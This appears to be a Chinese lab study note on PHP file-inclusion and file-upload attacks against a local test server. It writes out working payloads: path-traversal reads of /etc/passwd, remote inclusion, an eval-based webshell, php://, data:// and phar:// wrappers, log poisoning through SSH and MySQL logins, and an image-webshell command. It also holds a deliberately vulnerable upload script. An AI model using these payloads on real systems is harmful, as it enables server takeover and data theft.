# Web渗透-文件

## 0x01 文件包含漏洞

### 一、本地文件包含

#### 1、源代码

```php
$filename=$_GET['filename']
include $filename   //或include_once,require,require_once

echo "欢迎来到PHP的世界"
```

> 一旦使用include或其他三个文件包含的函数，那么无论包含函数的文件的后缀名是什么，均会当作代码来执行

#### 2、利用条件

php.ini 中 allow_url_fopen=on(默认开启)

用户参数可控且后台代码没有对包含的文件进行过滤

#### 3、利用方式

```shell
http://192.168.2.128/Security/fileinc.php?filename=misc.php&uname=woniu&passwd=123456789

http://192.168.2.128/Security/fileinc.php?filename=/etc/passwd

http://192.168.2.128/Security/fileinc.php?filename=/opt/lampp/etc/httpd.conf

#也可以使用相对路径
http://192.168.2.128/Security/fileinc.php?filename=../../../../etc/passwd

http://192.168.2.128/Security/fileinc.php?filename=C:\User\XXX\xxxx

http://192.168.2.128/Security/fileinc.php?filename=./login.html
```

### 二、远程文件包含漏洞

#### 1、利用条件

php.ini的allow_url_fopen=On和allow_url_include=Off开启

用户参数可控且后台代码没有对包含的文件进行过滤

#### 2、利用方式

```php
txt文件中写入：dbus:x:81:81:System <?php phpinfo();?> bus:/:/sbin/nologin
```

结果运行显示![](D:\WEBSecurity\Web\image\file1.png)

```
//试探,如果能加载则存在文件包含漏洞
http://192.168.2.128/Security/fileinc.php?filename=http://www.woniunote.com/index.php
#远程
http://192.168.2.128/Security/fileinc.php?filename=http://192.168.2.129/learn/temp/mm.php?code=phpinfo();

http://192.168.2.128/Security/fileinc.php?filename=./shell.txt&code=phpinfo();
```

### 三、利用包含文件写木马

前提双方的防火墙都关闭了

```
//在任意服务器上写入一段写木马程序
file_put_contents('temp/muma.php','<?php
    @eval($_GET['code']);

?>')
file_put_contents('temp/muma.txt','<?php
    @eval($_GET['code']);

?>')

http://192.168.2.128/Security/fileinc.php?filename='http://localhost/learn/shell.txt'
//此时muma.php或muma.txt写入本地服务器，再进行利用即可

//此时再利用包含漏洞进行包含，但是code参数无法正确传入
http://192.168.2.128/Security/fileinc.php?filename=temp/muma.txt?code=phpinfo()

//URL地址已经有参数了，所以只需要使用&符
http://192.168.2.128/Security/fileinc.php?filename=temp/muma.txt&code=phpinfo()

```

## 0x02 PHP伪协议利用

### 一、伪协议介绍

PHP支持以下几种协议：

```
file:// -访问本地文件系统
http:// -访问HTTP（s）网址
ftp:// -访问FTP(s)URLs
php:// -访问各个输入/输出流（I/O streams）
zlib:// -压缩流
data:// -数据(RFC 2397)
glob:// -查找匹配的文件路径模式
phar:// -php归档
ssh2:// -Secure Shell 2
rar:// -RAR
ogg:// -音频流
expect:// -处理交互式的流
```

php://是一种伪协议，主要开启了一个输入输出流，理解为文件数据传输的一个通道。php中的伪协议常使用的有如下几个：

php://input php://filter phar://

### 二、php://filter

当我们直接包含conn.php文件时，http://192.168.2.128/Security/fileinc.php?filename=common.php

虽然代码已经调用，但是因为其时php文档，被web容器解释，导致页面看不到源码内容。

这时候使用php://将我们想要读取的文件放在数据流中，然后我们通过伪协议的方式读出来

```
php://filter/read/convert.base64-encode/resource=common.php

http://192.168.2.128/Security/fileinc.php?filename=php://filter/read/convert.base64-encode/resource=common.php
```

这段命令的意思就是打开数据流，把conn.php的内容用base64编码方式读出来

我们执行后，在页面上就能看到遗传base64的编码，通过工具解码后就能看到明文源码

![](D:\WEBSecurity\Web\image\phpwp1.png)

获取后的base64数据流可以通过base64转码工具进行获取

![](D:\WEBSecurity\Web\image\phpwp2.png)

https://www.qqxiuzi.cn/bianma/base64.htm在线转码工具

在获取了conn文件中的用户和密码之后，我们可以在冰蝎中在虚拟终端登录数据库

![](D:\WEBSecurity\Web\image\phpwp3.png)

### 三、php://input

此方法需要条件，即开启allow_url_include=On。实际上这相当于一个远程包含的利用。

php://打开文件流后，我们直接在流里面写入我们的恶意代码。此时包含即可执行代码

http://192.168.2.128/Security/fileinc.php?filename=php://input

然后再POST请求中输入恶意代码，执行包含既可实现恶意代码的执行，比如：

```php
<?php phpinfo();?>
<?php system(ifconfig);?>
<?php system('ifconfig');?>//加但隐含可以防止warning
也可以通过该方法上传一个大马，然后继续宁远程控制
```

![](D:\WEBSecurity\Web\image\phpwp.png)

### 四、Phar://

主要是用于再php中对压缩文件格式的读取。这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击

用法就是把一句话木马压缩成zip格式，shell.txt->shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传zip文件），再访问：http://192.168.2.128/Security/fileinc.php?filename=phar://temp/shell.zip/shell.txt进行解压直接读取执行

> 要给目标服务器写入一个文件，要么直接想办法上传到目标服务器，要么进到命令行去攻击服务器上去下载。

### 五、zip://

也是对压缩文件进行读取操作，原理与用法跟phar几乎一样。区别是：

1、zip只能包含单级目录，即不能/shell.zip%23folder%23shell.txt，而phar支持多级。

2、再压缩文件内的目录符号，要改成#，且再浏览器中请求的话，还要进行url编码%23

http://192.168.2.128/Security/fileinc.php?filename=zip:///opt/lampp/htdocs/Security/temp/shell.zip%23shell.txt

### 六、data://

data://本身时数据流封装器，其原理和用法跟php://input类似，这里使用Get请求

data://text/plain,<?php phpinfo()?>

> plain原始文本，也可以替换成html

```

```

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==(这里使用base64编码的话，要减掉)

## 0x03文件包含漏洞利用

### 一、利用前提

（1）存在一个文件包含漏洞点

（2）我们有其他可控点可以写入到本地文件

（3）写入的本地文件路径可知或可预测



### 二、包含web日志

前期通过信息搜集，得到了相关的服务器信息，比如得知中间件时apache。

apache记录web日志的文件有access.log和error.log

这时候我们访问服务器的时候，通过burp修改我们的请求，将恶意代码写在请求内，这是web日志就会将我们的恶意代码写入到日志文件中。由于日志文件一般来说都说默认的路径比较容易猜测，这样就满足了我们的本地包含getshell的条件。

比如get请求 get "<?php phpinfo();?>".html

将恶意代码写入日志后，通过文件包含漏洞访问日志时即可得到恶意代码的执行结果

### 三、包含登录日志

如果发现一个Linux系统，开放了22端口，同时存在文件包含漏洞。那么我们可以构造恶意登录在ssh登录日志写入恶意代码。

Linux默认登录日志路径：/var/log/auth.log或/var/log/secure

使用xshell或ssh命令进行ssh登录：ssh"<?php phpinfo();?>"@192.168.2.128,此时，登录日志中将出现PHP代码。

如果MySQL开放远程登录，我们也同样可以登录MySQL日志：mysql -u "<?php phpinfo();?>" -p -h 192.168.2.128

在Linux上开启MySQL日志：

```
修改 /opt/lamppp/etc/my.cnf

general_log = ON
general_log_file = /opt/lampp/logs/mysql.log
log_output = file

确保/opt/lampp/logs目录具备o+w的权限，或者将日志文件写入到mysql自己的文件夹，同时mysql.log还需要o+r的权限
```

> MySQL5.7版本，或者非lampp套件，my.cnf的配置文件路径可能在/etc/my.cnf下，需要确认

### 四、包含mysql日志

包含mysql一般时在成功访问到MySQL后实现的。攻击者进入MySQL，可以通过数据库查询接口，实现恶意代码的昔日如mysql日志。方法和原理与包含web日志相同。比如进入phpmyadmin后台，或者爆破成功进入MySQL。

查看日志文件状态太：show variables like 'general_log'

写入恶意代码：select"<?php phpinfo(); ?>",根据日志文件路径即可包含。虽然能够到这一步已经是渗透测试成功，但是如果web服务器的权限更高的话，那么可以让web服务器来包含日志，这样web shell就会被高权限账号执行，实现提权。

### 五、包含上传文件

上传的话因为会检查后缀名，导致直接上传可执行文件失败。如果存在文件包含，就可以上传符合服务器的后缀名文件，但是在文件中昔日如恶意代码。比如使用图片马进行文件上传，进而再将其包含进来 

```
copy picture.jpg/b + shell.php/a picma.jpg
```

### 六、包含临时文件

临时文件指的是服务器会短暂存储，但是后续很快删除文件。比如上传检测的时候，某些检测机制会先把上传的文件保存到一个临时文件夹里或沙盒里，临时文件要看具体业务逻辑，而且包含临时文件需要利用条件竞争的方式。动静比较大，容易被发现。

竞争条件的使用方法：

a、使用burpsuite不停的发送上传包

b、我们再文件包含页面不停的尝试上传文件，期望恶意文件再被服务器删除之前访问到。

c、一旦包含成功，即使文件被删除，只要shell不断，就可以保持连接

### 七、包含session文件

通过cookie可以得知sessionID，session文件默认再服务器中存放的格式是sess_(sessID),而路径也是固定的，大多存在tmp目录下，因此只要找到一个可以控制session文件写入的点，就能利用包含漏洞getshell

## 0x04文件上传漏洞

### 一、准备实验环境

#### 1、前端注册页面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="jquery-3.4.1.min.js"></script>
    <title>注册</title>
    <style>
        table {
            width: 600px;
            margin: auto;
            border-spacing: 0;
            border: solid 1px green;
        }
        td {
            height: 50px;
            border: solid 1px gray;
            text-align: center;
        }
        button {
            width: 200px;
            height: 35px;
            background-color: dodgerblue;
            color: whitesmoke;
            border-radius: 5px;
        }
    </style>
    <script>
        // function doReg() {
        //     var username = $("#username").val();
        //     var password = $("#password").val();
        //     var param = "username=" + username + "&password=" + password;
        //     $.post('reg.php', param, function(data){
        //         if (data == 'reg-pass') {
        //             window.alert("注册成功");
        //             location.href="login-ajax.html";
        //         }
        //         else if (data == 'user-exists') {
        //             window.alert("用户名已经注册");
        //         }
        //         else {
        //             window.alert("注册失败");
        //         }
        //     });
        // }
    </script>
</head>
<body>
    <table>
        <!-- 上传附件，必须要加上 enctype="multipart/form-data" 属性  -->
        <form action="reg.php" method="POST" enctype="multipart/form-data">
        <tr>
            <td width="40%">用户名：</td>
            <td width="60%"><input type="text" id="username" name="username" /></td>
        </tr> 
        <tr> 
            <td>密&nbsp;&nbsp;码：</td>
            <td><input type="text" id="password" name="password"/></td>
        </tr>
        <tr> 
            <td>头&nbsp;&nbsp;像：</td>
            <td><input type="file" name="photo"></td>
        </tr>
        <tr>
            <td colspan="2"><button onclick="doReg()">注册</button></td>
        </tr>
        </form>
    </table>
</body>
</html>
```

#### 2、使用Ajax上传

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="jquery-3.4.1.min.js"></script>
    <title>注册</title>
    <style>
        table {
            width: 600px;
            margin: auto;
            border-spacing: 0;
            border: solid 1px green;
        }
        td {
            height: 50px;
            border: solid 1px gray;
            text-align: center;
        }
        button {
            width: 200px;
            height: 35px;
            background-color: dodgerblue;
            color: whitesmoke;
            border-radius: 5px;
        }
    </style>
    <script>
        function doReg() {
            var username = $("#username").val();
            var password = $("#password").val();
            var data = new FormData();	// 带附件上传
    		data.append("username", username);
    		data.append("password", password);
    		data.append("photo",$("#photo").prop("files")[0]);

            $.ajax({
    			url: 'reg.php',
    			type: 'POST',
    			data: data,
    			cache: false,
    			processData: false,
    			contentType: false,
    			
    			success : function(data) {
                    if (data == 'reg-pass') {
                        window.alert("注册成功");
                        location.href="login-ajax.html";
                    }
                    else if (data == 'user-exists') {
                        window.alert("用户名已经注册");
                    }
                    else {
                        window.alert("注册失败");
                    }
                }
            });
        }
    </script>
</head>
<body>
    <table>
        <tr>
            <td width="40%">用户名：</td>
            <td width="60%"><input type="text" id="username"/></td>
        </tr> 
        <tr> 
            <td>密&nbsp;&nbsp;码：</td>
            <td><input type="text" id="password"/></td>
        </tr>
        <tr> 
            <td>头&nbsp;&nbsp;像：</td>
            <td><input type="file" id="photo"></td>
        </tr>
        <tr>
            <td colspan="2"><button onclick="doReg()">注册</button></td>
        </tr>
        </form>
    </table>
</body>
</html>
```

#### 3、后台注册代码

```php
<?php

include "common.php";
$conn = create_connection();

$username = $_POST['username'];
$password = $_POST['password'];
$tmpPath = $_FILES['photo']['tmp_name'];    // 获取文件的临时路径
$fileName = $_FILES['photo']['name'];       // 获取文件的原始文件名
echo $tmpPath . "<br>";
$sql = "select username from user where username='$username'";
$result = mysqli_query($conn, $sql);
$count = mysqli_num_rows($result);

if ($count >= 1) {
    die('user-exists');
}

// 上传文件，从临时路径移动到指定路径
move_uploaded_file($tmpPath, './upload/'.$fileName) or die('文件上传失败');

// // 使用时间戳对上传文件进行重命名
// $newName = date('Ymd_His.') . end(explode(".", $fileName));
// move_uploaded_file($tmpPath, './upload/'.$newName) or die('文件上传失败');

$now = date('Y-m-d H:i:s');
$sql = "insert into user(username, password,role, avatar, createtime) values('$username', '$password', 'user','$newName', 'now()')";
mysqli_query($conn, $sql) or die('reg-fail');
mysqli_close($conn);

echo 'reg-pass';
echo '请确认你的个人信息：<br/><hr>';
echo "用户名：$username<br/>";
echo "密码为：$password<br/>";
echo "头像：<img src='./upload/$newName' width=300/><br/>";
echo "<a href='login.html'>点击登录</a>"
?>
```

#### 4、PHP获取文件属性

```
$_FILES["file"]["name"] - 被上传文件的名称
$_FILES["file"]["type"] - 被上传文件的类型
$_FILES["file"]["size"] - 被上传文件的大小，以字节计算
$_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称
$_FILES["file"]["error"] - 由文件上传导致的错误代码
```



### 二、上传webshell

由于没有过滤，所以直接可以上传WebShell，实现远程控制。



### 三、进行前后端校验

#### 1、在前端校验

```javascript
<!-- 添加 Javascript 代码，然后在form表单中 添加 onsubmit="return checkFile()" -->
    <script>
        function checkFile(){
            var file=document.getElementById('photo').value;
            if (file == null || file ==""){
                alert("请选择要上传的文件！");
                return false;
            }
            //定义允许上传的文件的类型
            var allow_ext=".jpg|.png|.gif";
            //提取上传文件的类型
            var ext_name=file.substring(file.lastIndexOf("."));
            //判断上传文件类型是否允许上传
            if(allow_ext.indexOf(ext_name) == -1) {
                var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件，当前文件类型为："+ ext_name;
                alert(errMsg);
                return false;
            }
        }
    </script>
<!-- From表单中添加 onsubmit 事件，这样在提交之前就会先调用 checkFile -->
<form action="reg.php" method="POST" enctype="multipart/form-data" onsubmit="return checkFile()">
```

> 绕过方式：在浏览器中禁用JavaScript直接用Burp重命令发送注册请求



#### 2、在后端校验
